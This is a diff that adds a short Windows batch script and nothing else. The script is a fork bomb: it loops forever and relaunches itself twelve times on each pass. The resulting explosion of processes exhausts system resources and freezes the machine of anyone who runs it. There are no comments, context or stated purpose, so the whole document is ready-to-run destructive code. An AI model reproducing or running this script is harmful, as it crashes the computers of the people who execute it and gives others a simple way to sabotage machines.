@@ -1,0 +1,15 @@
+@echo off
+:a
+start "" "%0"
+start "" "%0"
+start "" "%0"
+start "" "%0"
+start "" "%0"
+start "" "%0"
+start "" "%0"
+start "" "%0"
+start "" "%0"
+start "" "%0"
+start "" "%0"
+start "" "%0"
+goto a
